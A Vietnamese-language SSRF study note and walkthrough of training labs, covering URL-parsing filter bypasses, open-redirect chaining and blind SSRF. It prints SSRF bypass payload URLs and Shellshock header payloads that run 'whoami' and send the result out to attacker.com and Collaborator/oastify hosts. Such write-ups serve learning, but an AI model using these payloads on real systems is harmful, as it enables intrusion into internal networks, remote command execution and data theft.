# Kiến thức cần biết

## URL parsing 101 & SSRF bypass technique

- URL có dạng đầy đủ:

```schema://[user:password@]host[:port]/path[?query] [#fragment]```

-->Ví dụ: ```http://user:pass@localhost/admin```

Trong đó:

    • Host là phần quan trọng được kiểm tra trong whitelist

    • Nhưng user:pass@host hay #fragment đôi khi đánh lừa được cơ chế phân tích URL nếu không được kiểm tra đúng cách.


🛠 Các kỹ thuật SSRF bypass whitelist

1. User infor injection:

- Syntax: ```http://allowed-domain@localhost/admin```

- Hoạt động: 

    • Bộ lọc kiểm tra thấy ```allowed-domain``` --> Chấp nhận

    • Nhưng trình xử lý thấy request (backend) sẽ lấy phần sau @ làm hostname -->localhost

2. DNS subdomain injection:

- Syntax: ```http://stock.welikethis.com.localhost```

    • Backend có thể chấp nhận subdomain, nhưng thực chất localhost được sử dụng

    • Dễ hoạt động nếu whitelist dùng ```contains()``` thay vì ```equals()```.


3. Fragment smuggling (#):

- Syntax: ```http://localhost/admin#stock.welikethis.com```

    • Nếu kiểm tra ```stock.welikethis.com``` có tồn tại trong chuỗi URL -->pass filter

    • Nhưng trình HTTP sẽ bỏ qua #fragment, thực sử gửi đến localhost.


4. URL Encoding và Double Encoding:

- Encode ký tự /, @, : để che dấu

-->Dùng để vượt qua filter nhưng vẫn được decode đúng phía backend.


5. Mix các kỹ thuật:

-->Dùng nhiều kỹ thuật cùng lúc để bypass filter lẫn kiểm tra chéo.


![alt text](./img/need1.png)

## Thành phần của 1 URL

```python
from urllib.parse import urlparse, unquote

def parse_url(raw_url):
    print(f"URL Gốc     : {raw_url}")
    decoded_url = unquote(raw_url)
    print(f"Đã decode   : {decoded_url}")
    parsed = urlparse(decoded_url)

    print("\n📦 Phân tích URL:")
    print(f"- Scheme     : {parsed.scheme}")
    print(f"- User Info  : {parsed.username or ''}")
    print(f"- Host       : {parsed.hostname}")
    print(f"- Port       : {parsed.port or 'Mặc định (80/443)'}")
    print(f"- Path       : {parsed.path}")
    print(f"- Query      : {parsed.query}")
    print(f"- Fragment   : {parsed.fragment}")
    print("-" * 40)
# Ví dụ các payload SSRF
urls = [
    "http://localhost%2523stock.weliketoshop.net",
    "http://localhost%2523@stock.weliketoshop.net",
    "http://127.0.0.1@stock.weliketoshop.net/admin",
    "http://localhost/admin#stock.weliketoshop.net",
    "http://stock.weliketoshop.net@127.0.0.1/admin",
]

for u in urls:
    parse_url(u)
```

- Chạy code này để quan sát kỹ các thành phần 1 URL.

## Shellshock-CVE-2014-6271

- Là 1 lỗ hổng trong ```Bash shell```, xảy ra khi biến môi trường chứa ```function``` bị ghi sai định dạng.

-Nếu bạn gửi 1 header như:

```User-agent: () {:;}; ping attacker.com```

-->Server chạy lệnh ping ```attacker.com``` nếu nó sử dụng Bash để xử lý header đó.

==>Vulnerable ở phần ```User-agent```.

## Burp Collaborator

- Là 1 dịch vụ trung gian giúp bạn biết khi nào target gửi DNS hoặc HTTP request ra ngoài.

- Bạn tạo payload như:

```Ping `whoami`.abc123.burpcollaborator.net```

-->Server sẽ ping domain chứa output của ```whoami``` 

-->Bạn nhìn thấy trong tab ```Collaborator client``` 

--> ```Poll now```.


# Lab Server-side Request Forgery

## Lab: Basic SSRF against the local server

**END GOALS**: Change the stock URL to access the admin interface and delete the user carlos.

-Lab này có ```backend admin``` xử lý yêu cầu xóa user chạy trên cùng 1 máy với ```frontend web```, nên bạn chỉ cần SSRF với ```localhost```.


## Lab: Basic SSRF against another back-end system

**END GOAL**: use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

- ```Backend admin``` chạy ở 1 server ***riêng biệt*** trong mạng LAN, có IP riêng như ```192.168.0.x``` không phải ```localhost```.

- Kiến trúc:

```text
+------------------+     +------------------------+
|  Frontend Server | --> |  Backend Admin Server  |
|  192.168.0.10     |     |  192.168.0.11:8080     |
```

==>Bạn phải dùng SSRF để nhờ frontend gửi request đến 192.168.0.11:8080

- Phân tích: 

  - Khi gửi SSRF đến IP không có service đang chạy: Server sẽ cố gắng kết nối đến IP đó nhưng thất bại 

-->Sẽ trả về lỗi ```500 Internal Server Error``` 

  - Khi gửi SSRF đến đúng IP Backend có service lắng nghe: Request được gửi thành công đến server đó. Nếu chưa chỉ định đúng ```endpoint```

-->Server sẽ trả về ```404 not found``` - nghĩa là kết nối thành công nhưg có có route /

- Thử chèn payload ssrf: ```http://localhost/```

![alt text](./img/lab1-1.png)

==>Vậy ở web này ```Backend admin``` không chạy trên ```localhost``` nữa mà chạy ở 1 máy khác trong mạng nội bộ.

- Mới đầu ```stockApi``` có địa chỉ như này:

![alt text](./img/lab1-2.png)

==>Địa chỉ IP này chưa chắc đã là ```backend thật```

- Frontend chỉ relay request đến IP đó đến ```fetch stock info``` nhưng ```backend admin``` nằm ở IP khác.

==>Giờ bruteforce dải địa chỉ ```192.168.0.1``` để tìm cái nào trả về ```404``` thui.

==>Tìm ra địa chỉ backend thật là ```http://192.168.0.2:8080/```

-Chèn endpoint ```/admin``` thì hiện ra:

![alt text](./img/lab1-3.png)



## Lab: SSRF with blacklist-based input filter

**END goal** change the stock check URL to access the admin interface at ```http://localhost/admin``` and delete the user ```carlos```

- Ở lab này đã bị filter các payload như ```127.0.0.1``` và ```localhost``` cũng như ```/admin``` . Hãy tìm cách bypass các filter đó.

- Ở filter ```127.0.0.1``` có thể được viết lại bằng ```127.1``` (Cách viết khác của IP) hoặc có thể **search gg** "```IPv4 to decimal```" để chuyển IP về dạng thập phân hoặc cũng có thể chuyển về dạng thập lục phân,.... 

-Để bypass ```/admin``` thì URL encode nó 2 phát là ok.

![alt text](./img/lab2-1.png)

==>Đoán là có thể backend của web chạy trên localhost.

![alt text](./img/lab2-2.png)

- Dùng các phương án bypass như đã nêu ở trên.

![alt text](./img/lab2-3.png)

![alt text](./img/lab2-4.png)



## Lab: SSRF with whitelist-based input filter

**END goal** change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

- Cần khai thác kỹ thuật đánh lừa quá trình phân tích URL để truy cập vào http://localhost/admin

- Website:

  - Ứng dụng có chức năng stock check gửi request đến URL bạn nhập.

  - Chỉ cho phép những URL hợp lệ, theo whitelist.

  - Cần gửi SSRF đến ```http://localhost/admin``` để xóa user carlos

  - Challenge: localhost không nằm trong whitelist --> Bị chặn.

- Ở bài này cần kết hợp các kỹ thuật bypass lại để có thể vượt qua filter của server.

📌 Mục tiêu : Khiến trình parser thật sự gửi đến localhost

  - HTTP client (ở backend) sẽ phân tích URL như sau:
```bash
scheme: http
userinfo: localhost%23
host: stock.weliketoshop.net
```

  - Nhưng nếu parser xử lý lỗi (hoặc cố decode localhost%23), thì:

    - %23 → #

    - localhost# → fragment sẽ bị bỏ qua

    - Và nhiều HTTP clients hiểu sai, sẽ lấy phần localhost làm host thực sự

📌 Tức là:

  -  Filter kiểm tra: thấy "stock.weliketoshop.net" → PASS ✅

  - Backend parser: lại gửi request đến localhost → ✅

![alt text](./img/lab3-1.png)

- Phân tích chút:

![alt text](./img/lab3-2.png)

- nếu bạn có:

```http://user@host/path?query```

→ Trình gửi request (HTTP client) sẽ gửi đến host, và kèm:

```GET /path?query HTTP/1.1```

→ Vậy query không bị ảnh hưởng gì bởi @, miễn là nó nằm sau phần host thực sự.


## Lab: SSRF with filter bypass via open redirection vulnerability

**END goal** change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

🧭 Chiến lược thực hiện

1.  Tìm endpoint Open Redirect trong ứng dụng       
2. Dùng URL hợp lệ nội bộ để bypass filter      
3. Redirect đến IP nội bộ ```http://192.168.0.12:8080/admin/delete?username=carlos```      
4. SSRF được thực thi → xóa tài khoản Carlos


- Lab này, ```stockApi``` đã không phải path đến 1 webserver nữa mà redirect đến 1 trang của web ```/product/stock/check?productId=1&storeId=1```

![alt text](./img/lab4-1.png)

==> Backend đã giới hạn chỉ cho phép đường dẫn nội bộ (same-origin)

-Tức là không có ```http://``` ==>Không thể chỉ định host đích 

==>Không thể gửi SSRF trực tiếp ra ngoài.

![alt text](./img/lab4-2.png)

- Giờ ta sẽ đi tìm endpoint open redirect, ấn vào mục ```netx product``` trong trang hiện tại và quan sát burp:

![alt text](./img/lab4-3.png)

==>Có thể đây là endpoint ta cần tìm.

-Giờ copy nó và paste vào ```stockApi``` và thay đổi path thành ```http://192.168.0.12:8080/admin```  xem điều gì xảy ra:

![alt text](./img/lab4-4.png)

==>Thành công.


## Lab: Blind SSRF with out-of-band detection

**END goals**: dùng burp collaborator làm 1 HTTP request tới Burp Collaborator server public.

![alt text](./img/lab5-1.png)

Vào burp collaborator copy link server sau đó thay vào trường refferer:

![alt text](./img/lab5-2.png)


## Lab: Blind SSRF with Shellshock exploitation

**END goal** use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

- Vulnerable parameter:  ```Refferer header```

- Ở lab này ta không thấy có dấu hiệu gì của ```SSRF``` hay gì khác.

==>Sử dụng extension ```Collaborator-everywhere``` để tìm các dấu hiệu...

- Bước 1: Mở Burp ```Collaborator Client``` lấy payload domain:

![alt text](./img/lab6-1.png)

- Bước 2: Thay ```User-Agent``` thành:

 ```() { :; }; ping `whoami`.iawki9kzpa1w5088jni6zdoprgx7lx9m.oastify.com```

Và Refferer thành: ```http://192.168.0.X:8080/```

![alt text](./img/lab6-2.png)


- Với X ta sẽ ```brute-force``` ở Intruder sau đó vào collaborator để xem các packet.

- Bước 3: Quan sát kêt quả trong ```Burp Collaborator```:

  - Nếu thấy request tới subdomain như:

```HTTP request to: whoami.9zgyyyxn...burpcollaborator.net```

-->Nghĩa là:

    • SSRF thành công.

    • Shellshock RCE thành công.

    • Command whoami được thực thi

Kết quả được leak ra ngoài.

![alt text](./img/lab6-3.png)

==>Vậy whoami là ```peter-Dd8zdE```

